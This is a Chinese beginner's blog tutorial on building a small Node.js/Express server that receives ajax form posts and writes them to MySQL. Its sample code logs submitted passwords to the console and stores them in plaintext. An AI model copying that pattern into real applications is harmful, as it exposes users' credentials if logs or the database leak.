$ npm install express  //使用 npm 命令安装express(web框架)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模块的调用，在js里面使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
var express = require('express');   //调用express模块
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;模块的安装有两种形式，一种时本地一种时全局（-g） ，require是调用本地的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;npm install express         // 本地安装
npm install express -g   //全局安装&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我这里就不做多解释， 大家可以去网上看看，node.js的东西还是不少的，需要时间去学习&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;strong&gt;3.Express 搭建简单web&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;什么是Express呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Express 是一个简洁而灵活的 node.js Web应用框架&lt;br/&gt;提供了一系列强大特性帮助你创建各种 Web 应用，和丰富的 HTTP 工具。
使用 Express 可以快速地搭建一个完整功能的网站。
Express 框架核心特性：
1.可以设置中间件来响应 HTTP 请求。
2.定义了路由表用于执行不同的 HTTP 请求动作。
3.可以通过向模板传递参数来动态渲染 HTML 页面。   ----引用互联网&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;之前说到，需要的模块要安装，所以这里我们要先安装这个模块&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
$ cnpm install express --save  //安装express并保存在依赖列表，可以理解为安装在本地，这样方便调用
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当然我们还需要其他的框架，当然是否需要根据需求来&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$ cnpm install body-parser --save   //处理 JSON, Raw, Text 和 URL 编码的数据。
$ cnpm install cookie-parser --save  //解析Cookie工具,通过req.cookies取到cookie并转成对象
$ cnpm install multer --save   //用于处理 enctype=&quot;multipart/form-data&quot;（设置表单的MIME编码）的表单数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ cnpm list express  //查询版本号，也是看是否安装成功
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;不多说直接上代码创建一个js文件，我这里是取名server.js&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;var&lt;/span&gt; express = require('express'&lt;span&gt;);  //调用模块
&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app =&lt;span&gt; express();
app.get(&lt;/span&gt;'/', &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (req, res) {  //get请求
   res.send(&lt;/span&gt;'Hello World'&lt;span&gt;);
})
&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server = app.listen(8888, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {   //监听端口
  &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host =&lt;span&gt; server.address().address
  &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port =&lt;span&gt; server.address().port
  console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port)
})&lt;p&gt;当然还可以这样写&lt;br/&gt;&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　　 var&lt;/span&gt; express=require('express'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; jqery=require('jquery'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app=&lt;span&gt;express();
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 get   用来处理get数据提交的路由，后门我们会说路由&lt;/span&gt;
      app.get('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁GET請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello get&quot;&lt;span&gt;);
      })&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server=app.listen(8081,&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host=&lt;span&gt;server.address().address
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port=&lt;span&gt;server.address().port
          console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port);
      })&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;那么问题来了，怎么运行才是一个node.js程序呢，毕竟我们好像什么都没声明&lt;/p&gt;
&lt;p&gt;直接用cmd命令行运行这个文件  &lt;strong&gt;node server.js&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先我们的路径要是根目录，可以直接文件夹找到然后在路径栏直接写cmd，cmd将自动以当前路径开始&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171534684-352863336.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171410450-465308046.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109171606872-796389026.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样就运行成功了，下面这句话是我写的，成功打印出来了，然后用浏览器打开页面，页面路径是127.0.0.1:8888&lt;/p&gt;
&lt;p&gt; 这样一个基础的web就好了&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.什么是Node.js的路由 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 由于我们之后和ajax数据传递的时候需要用到路由，所以我们还是了解一下， 而且路由的确是很重要的，我这里简单的介绍一下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;路由决定了由谁(指定脚本)去响应客户端请求。
在HTTP请求中，我们可以通过路由提取出请求的URL以及GET&lt;/span&gt;/POST参数。
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;路由演示&lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; route_express(){
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; express=require('express'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; jqery=require('jquery'&lt;span&gt;);
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app=&lt;span&gt;express();
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 get&lt;/span&gt;
      app.get('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁GET請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello get&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;主頁 post請求&lt;/span&gt;
      app.post('/',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;主頁post請求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;hello post&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;刪除頁面&lt;/span&gt;
      app.get('/del_user',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;del_user get 響應要求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;刪除頁面&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;用戶頁面請求&lt;/span&gt;
      app.get('/list_user',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
          console.log(&lt;/span&gt;&quot;list_user get 響應要求&quot;&lt;span&gt;);
          res.send(&lt;/span&gt;&quot;用戶頁面請求&quot;&lt;span&gt;);
      })
      
      &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server=app.listen(8081,&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(){
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host=&lt;span&gt;server.address().address
          &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port=&lt;span&gt;server.address().port
          console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port);
      })
      
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后运行js文件，可以用过访问不同的地址得到不同的效果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre readability=&quot;4&quot;&gt;
http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;127.0.0.1:8081/list_user&lt;/span&gt;
&lt;span&gt;
http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;127.0.0.1:8081&lt;/span&gt;
&lt;span&gt;
http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span readability=&quot;2&quot;&gt;127.0.0.1:8081/del_user&lt;p&gt;会分别打印不同路由配置的文字&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.Node.js+Express+路由+ajax 数据交互&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上面说了那么多，现在直接上代码，关于nodejs和ajax前后台数据的交互&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当然文件路径也很重要&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109173849200-2040935236.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;表單提價 &lt;/span&gt;
&lt;span&gt;  from_submit();  //为了方便管理我用函数包起来调用
  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;表單提價 &lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; from_submit(){
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; express = require('express'&lt;span&gt;);  //调用模板
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; app =&lt;span&gt; express();  //不污染本来，用变量来表示
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; bodyParser = require('body-parser'&lt;span&gt;);  //调用模板&lt;br/&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;創建編碼解析&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; urlencodedParser = bodyParser.urlencoded({ extended: &lt;span&gt;false&lt;/span&gt;&lt;span&gt; })
    
    app.use(express.static(&lt;/span&gt;'public'&lt;span&gt;));  //设置今天文件目录
    
    app.get(&lt;/span&gt;'/form_index.html',&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(req,res){
        res.sendFile(__dirname&lt;/span&gt;+&quot;/&quot;+&lt;span&gt;form_index.html); //提供静态文件
    })
    
    app.post(&lt;/span&gt;'/process_post', urlencodedParser, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; (req, res) {  //post处理方法
 
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 输出 JSON 格式&lt;/span&gt;
       &lt;span&gt;var&lt;/span&gt; response =&lt;span&gt; {
           &lt;/span&gt;&quot;names&quot;&lt;span&gt;:req.body.names,   //得到页面提交的数据
           &lt;/span&gt;&quot;passwords&quot;&lt;span&gt;:req.body.passwords
       };
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加入數據庫&lt;/span&gt;
&lt;span&gt;       mysql_connec(req.body.names,req.body.passwords);  //数据库方法，加入了两个参数，是提交的数据
       console.log(response);
          res.send(&lt;/span&gt;&quot;1&quot;&lt;span&gt;); //返回的数据，这里根据情况写
       res.end();
       
    })
    
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; server = app.listen(8888, &lt;span&gt;function&lt;/span&gt;&lt;span&gt; () {  //监听
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; host =&lt;span&gt; server.address().address
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; port =&lt;span&gt; server.address().port
    console.log(&lt;/span&gt;&quot;应用实例，访问地址为 http://%s:%s&quot;&lt;span&gt;, host, port)
    })
    
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面是html页面&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;charset&lt;/span&gt;&lt;span&gt;=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;src&lt;/span&gt;&lt;span&gt;=&quot;jquery-1.9.1.min.js&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt; charset&lt;/span&gt;&lt;span&gt;=&quot;utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;form &lt;/span&gt;&lt;span&gt;&amp;lt;!--action&lt;/span&gt;&lt;span&gt;=&quot;http://127.0.0.1:8888/process_post&quot;&lt;/span&gt;&lt;span&gt; method&lt;/span&gt;&lt;span&gt;=&quot;post&quot;&lt;/span&gt;&lt;span&gt; --&lt;/span&gt;&lt;span&gt;&amp;gt; &amp;gt; //这里我隐藏了表单提交的两个参数，&lt;br/&gt;　　　　　　　　　　　　　　　　　　        我用了ajax，如果不用ajax直接就填写路径参数和请求方式就可以了&lt;/span&gt;&lt;span&gt;
       name: &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;names&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;br/&gt;&lt;/span&gt;       password: &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;password&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;passwords&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
       &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;myForm&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;button&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;form&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;script &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text/javascript&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
            $(&lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;() {
                $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.myForm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).on(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;click&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;() {  //添加点击事件
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; names &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input:nth-of-type(1)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).val();   //获取两个的参数
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt;&lt;span&gt; passwords &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; $(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input:nth-of-type(2)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;).val();
                    $.post(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://127.0.0.1:8888/process_post&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, { //jq的post方法
                        names: names,
                        passwords: passwords
                    }, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(res) {
                        alert(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;提交成功&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                    })
                })
            })
        &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;script&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174307966-989118230.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;提交成功并且数据库有内容&lt;/p&gt;
&lt;p&gt; 这是cmd的提交打印的方法，这里是数据库连接方法打印的，等下后面说&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174339997-880887638.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174418184-457422168.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109174434059-652392472.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图是数据库刚添加的&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt; 4&lt;/strong&gt;.Node.js+MySql 获得数据写入数据库&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;后台没有数据库怎么算是后台呢，获取了数据存入数据库才算完整，说起来之前我是完全没玩过数据库&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为了nodejs才学的，其实也不难，首先安装MySql，直接百度下载然后安装就好了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;安装之后首先要打开数据库服务，然后cmd打开，我们小测试一下&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175027763-447888751.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;打开安装好的数据库命令行文件，然后输入密码，安装时输入的root密码，看到下面这些就代表可以使用了&lt;/p&gt;
&lt;p&gt;但是有个问题，用cmd写数据库还是很麻烦的，所以我们需要一个可视化软件，当然小编比较懒才用的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175157856-590268653.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下载数据库可视化软件&lt;/p&gt;
&lt;p&gt;页面是这样的，这里已经建好了一张表，当然首先要连接数据库，数据库教程大家可以去网上看看，也是狠多的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175228434-1060374395.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面开始写&lt;/p&gt;
&lt;p&gt;当然我们还是需要引入模块，首先安装&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
$ cnpm install mysql
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;72&quot;&gt;
&lt;pre readability=&quot;31&quot;&gt;
&lt;br/&gt;这里因为只需要添加数据于是我就注释了其他方法，这个方法就加载刚才的js里面，这里也是一个方法，添加参数&lt;p&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;數據庫鏈接方法&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;mysql_connec();&lt;/span&gt;
  
  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;數據庫鏈接方法&lt;/span&gt;
  &lt;span&gt;function&lt;/span&gt;&lt;span&gt; mysql_connec(name,pas) {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;鏈接數據庫&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; mysql = require(&quot;mysql&quot;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; connection =&lt;span&gt; mysql.createConnection({  //配置参数，然后添加你的数据库里面的表
        host: &lt;/span&gt;'localhost'&lt;span&gt;,
        user: &lt;/span&gt;'root'&lt;span&gt;,
        password: &lt;/span&gt;'*********'&lt;span&gt;,
        database: &lt;/span&gt;'xmibear'&lt;span&gt;
    })

    connection.connect();  //连接

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;查詢語句&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var selectSql = &quot;select * from formtable&quot;;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    connection.query(selectSql, function(err, res) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        if(err) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            console.log('[select error]-', err.message);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            return;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        }&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n\n----------查詢語句-----------------------\n&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(res);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n----------查詢語句ENDENDNEDNED-----------&quot;);&lt;/span&gt;&lt;span&gt;
//
//&lt;/span&gt;&lt;span&gt;    })&lt;/span&gt;

    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;插入數據&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; addSql = &quot;insert into formtable(id,name,password) values(0,?,?)&quot;&lt;span&gt;; //存放数据库语言的，这里是添加
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; addParmas =&lt;span&gt; [name, pas];
    connection.query(addSql, addParmas, &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt;(err, res) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(err) {
            console.log(&lt;/span&gt;&quot;[insert error]-&quot;&lt;span&gt;, err.message);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }&lt;br/&gt;//cmd打印内容
        console.log(&lt;/span&gt;&quot;\n\n----------插入數據-----------------------\n&quot;&lt;span&gt;);
        console.log(res);
        console.log(&lt;/span&gt;&quot;\n----------插入數據ENDENDNEDNED-----------&quot;&lt;span&gt;);

    })

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;更新數據&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var upSql = &quot;update formtable set name=?,password=? where id=?&quot;;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    var upParmas = [&quot;劉王婆&quot;, &quot;55555&quot;, 1];&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    connection.query(upSql, upParmas, function(err, res) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        if(err) {&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            console.log(&quot;[updata error]-&quot;, err.message);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;            return;&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        }&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n\n----------更新數據-----------------------\n&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(res);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;        console.log(&quot;\n----------更新數據ENDENDNEDNED-----------&quot;);&lt;/span&gt;&lt;span&gt;
//&lt;/span&gt;&lt;span&gt;    })&lt;/span&gt;
&lt;/p&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后运行文件&lt;/p&gt;
&lt;p&gt;在前台html提交的时候cmd就会打印，这时候数据已经存进数据库了，刷新就看到了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/910957/201711/910957-20171109175739450-1221310192.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;到这里及说完了，但是很多东西还是要自己试试才知道，当然我觉得不是很难，入门还是可以的&lt;/p&gt;

</description>
<pubDate>Thu, 09 Nov 2017 10:00:00 +0000</pubDate>
<dc:creator>小熊一乐</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mibear/p/nodejs.html</dc:identifier>
</item>
</channel>
</rss>